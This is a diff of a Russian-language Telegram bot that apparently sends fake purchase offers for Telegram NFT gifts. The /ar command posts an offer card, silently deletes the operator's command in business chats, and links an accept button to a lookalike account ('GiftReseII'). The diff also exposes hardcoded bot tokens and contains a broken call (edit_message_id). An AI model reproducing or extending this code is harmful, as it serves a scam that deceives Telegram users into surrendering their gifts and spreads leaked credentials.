@@ -14,13 +14,13 @@ from aiogram.types import (
 )
 
 # Токен вашего бота
-BOT_TOKEN = "8983992347:AAHK7oQH8rA5rgYblvnUktThq8ODbV-F1iM"
+BOT_TOKEN = "8852237085:AAGWl1SPhs8E1R1yGcnwJC8xApuPW21nNRs"
 
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher(storage=MemoryStorage())
 
 # Ваш Telegram ID (главный администратор)
-SUPER_ADMIN_IDS = [8975317102,629408999,6973187474]  
+SUPER_ADMIN_IDS = [8975317102, 629408999, 6973187474, 6217489845]  
 
 ALLOWED_FILE = "allowed_users.json"
 ALL_USERS_FILE = "all_users.json"
@@ -45,7 +45,6 @@ def save_json_set(filename: str, data: set):
     with open(filename, "w", encoding="utf-8") as f:
         json.dump(list(data), f)
 
-# Управление конфигом (ссылкой для передачи NFT)
 def load_config() -> dict:
     if os.path.exists(CONFIG_FILE):
         try:
@@ -168,7 +167,8 @@ async def fetch_real_nft_data(slug: str) -> dict:
 def format_parsed_card(data: dict, price_display: str) -> str:
     return (
         f"Пользователь предлагает Вам <b>{price_display}</b> за подарок <b><a href='{data['url']}'>{data['name']}</a></b>.\n\n"
-        f"Предложение действует ещё 6 ч. 0 мин.."
+        f"Предложение действует ещё 6 ч. 0 мин..\n"
+        f"{data['url']}"
     )
 
 def get_step1_kb() -> InlineKeyboardMarkup:
@@ -180,7 +180,6 @@ def get_step1_kb() -> InlineKeyboardMarkup:
     ])
 
 def get_step2_kb() -> InlineKeyboardMarkup:
-    # Динамически подгружаем ссылку из файла конфигурации
     config = load_config()
     target_url = config.get("nft_url", "https://t.me/GiftReseII")
     return InlineKeyboardMarkup(inline_keyboard=[
@@ -382,55 +381,50 @@ async def process_broadcast(message: Message, state: FSMContext):
         try:
             await bot.send_message(uid, broadcast_text, parse_mode="HTML")
             success += 1
-            await asyncio.sleep(0.04)
+            await asyncio.sleep(0.1)
         except Exception:
             fail += 1
             
     await status_msg.edit_text(
         f"📢 <b>Рассылка завершена!</b>\n\n"
         f"✅ Успешно доставлено: <b>{success}</b>\n"
-        f"❌ Ошибок (заблокировали бота): <b>{fail}</b>",
+        f"❌ Ошибок: <b>{fail}</b>",
         parse_mode="HTML"
     )
+
+# ==================== ЛОГИКА КОМАНДЫ /ar ====================
 
 async def execute_ar_command(message: Message, is_business: bool = False):
     user_id = message.from_user.id
     register_user(user_id)
-    
+
     if not is_authorized(user_id):
         await message.answer("❌ У вас нет доступа к использованию этого бота.")
         return
 
+    # Безопасно убираем /ar из текста
     text = message.text or ""
-    args_text = text[3:].strip()
+    args_text = re.sub(r'^/ar(@\w+)?\s*', '', text, flags=re.IGNORECASE).strip()
     raw_args = args_text or "MirageLamp-44307 2727 stars"
-    
+
     slug, price_display, _ = parse_query_and_price(raw_args)
+    
+    # Если это бизнес-чат, получаем ID подключения
     biz_conn_id = message.business_connection_id if is_business else None
-    data = await fetch_real_nft_data(slug)
+
+    try:
+        data = await fetch_real_nft_data(slug)
+    except Exception:
+        await message.answer("⚠️ Не удалось получить данные по офферу, попробуйте позже.")
+        return
 
     preview_opts = LinkPreviewOptions(
         is_disabled=False,
-        url=data["url"],
         prefer_large_media=True,
-        show_above_text=True
+        show_above_text=True,
     )
 
-    if biz_conn_id:
-        try:
-            await bot.edit_message_text(
-                chat_id=message.chat.id,
-                message_id=message.message_id,
-                business_connection_id=biz_conn_id,
-                text=format_parsed_card(data, price_display),
-                parse_mode="HTML",
-                link_preview_options=preview_opts,
-                reply_markup=get_step1_kb()
-            )
-            return
-        except Exception:
-            pass
-
+    # 1. Отправляем карточку
     try:
         await bot.send_message(
             chat_id=message.chat.id,
@@ -438,25 +432,58 @@ async def execute_ar_command(message: Message, is_business: bool = False):
             text=format_parsed_card(data, price_display),
             parse_mode="HTML",
             link_preview_options=preview_opts,
-            reply_markup=get_step1_kb()
+            reply_markup=get_step1_kb(),
         )
-        if biz_conn_id:
+    except Exception as e:
+        await message.answer(f"⚠️ Ошибка отправки карточки: {e}")
+        return
+
+    # 2. Пауза, чтобы Telegram успел отрисовать карточку
+    await asyncio.sleep(0.5)
+
+    # 3. Удаление сообщения с командой /ar
+    if biz_conn_id:
+        try:
             await bot.delete_business_messages(
                 business_connection_id=biz_conn_id,
-                message_ids=[message.message_id]
+                message_ids=[message.message_id],
             )
-        else:
+        except Exception as e:
+            # Если Telegram запретил удалять, бот напишет вам ПРЯМО В ЧАТ
+            error_text = (
+                f"⚠️ <b>Telegram не дал удалить команду /ar!</b>\n\n"
+                f"Причина: <code>{e}</code>\n\n"
+                f"👉 <b>Что делать:</b>\n"
+                f"1. Зайдите в настройки Telegram.\n"
+                f"2. Перейдите в <b>Telegram Business -> Чат-боты</b>.\n"
+                f"3. Выберите этого бота.\n"
+                f"4. Включите галочку <b>«Удаление сообщений»</b> (Delete messages).\n"
+                f"5. Перезапустите бота."
+            )
+            await bot.send_message(
+                chat_id=message.chat.id,
+                business_connection_id=biz_conn_id,
+                text=error_text,
+                parse_mode="HTML"
+            )
+            print(f"[ОШИБКА УДАЛЕНИЯ]: {e}")
+    else:
+        try:
             await message.delete()
-    except Exception as e:
-        print(f"Ошибка отправки карточки: {e}")
+        except Exception as e:
+            await message.answer(f"⚠️ Ошибка удаления: <code>{e}</code>", parse_mode="HTML")
 
+# Обработчик для Бизнес-аккаунтов
+@dp.business_message(F.text.startswith("/ar"))
+async def handle_business_ar(message: Message):
+    await execute_ar_command(message, is_business=True)
+
+# Обработчик для Обычных чатов
 @dp.message(F.text.startswith("/ar"))
 async def handle_regular_ar(message: Message):
     await execute_ar_command(message, is_business=False)
 
-@dp.business_message(F.text.startswith("/ar"))
-async def handle_business_ar(message: Message):
-    await execute_ar_command(message, is_business=True)
+# ==================== КНОПКИ ОФФЕРА ====================
 
 @dp.callback_query(F.data == "step2_accept")
 async def process_step2(callback: CallbackQuery):
@@ -481,8 +508,10 @@ async def process_decline(callback: CallbackQuery):
     if callback.message:
         await callback.message.edit_text(text=declined_text, parse_mode="HTML")
     elif callback.inline_message_id:
-        await bot.edit_message_text(inline_message_id=callback.inline_message_id, text=declined_text, parse_mode="HTML")
+        await bot.edit_message_id(inline_message_id=callback.inline_message_id, text=declined_text, parse_mode="HTML")
     await callback.answer("Оффер отклонен")
+
+# ==================== ЗАПУСК ====================
 
 async def main():
     print("Бот успешно запущен!")
